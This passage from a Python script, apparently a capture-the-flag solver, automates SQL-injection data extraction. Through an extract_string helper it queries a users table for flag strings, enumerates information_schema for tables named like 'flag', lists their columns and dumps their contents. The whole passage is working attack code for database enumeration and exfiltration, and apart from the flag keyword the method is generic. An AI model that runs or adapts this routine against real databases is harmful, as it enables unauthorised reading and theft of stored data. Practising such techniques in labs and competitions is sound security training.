    for column in columns:
        print(f"\n[+] Searching in column: {column}")
        query = f"SELECT {column} FROM users WHERE {column} LIKE '%FLAG%' OR {column} LIKE '%flag%'"
        result = extract_string(query, max_length=200)
        if result:
            print(f"[+] Found potential flag in {column}: {result}")
            if "FLAG{" in result or "flag{" in result:
                print(f"[!] FLAG FOUND: {result}")
                return result
    
    # Search all tables
    print("\n[+] Searching for tables containing 'flag'...")
    for i in range(0, 20):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%' LIMIT 1 OFFSET {i}"
        table = extract_string(query, max_length=100)
        if table:
            print(f"[+] Found table: {table}")
            # Extract all data from this table
            print(f"[+] Extracting data from {table}...")
            
            # Get column names
            for j in range(0, 5):
                col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {j}"
                column = extract_string(col_query, max_length=50)
                if column:
                    print(f"[+] Column: {column}")
                    
                    # Extract data from this column
                    data_query = f"SELECT {column} FROM {table} LIMIT 1"
                    data = extract_string(data_query, max_length=200)
                    print(f"[+] Data: {data}")
                    
                    if "FLAG{" in str(data) or "flag{" in str(data):
                        print(f"[!] FLAG FOUND: {data}")
                        return data
                else:
                    break
        else:
            break
    
    return None

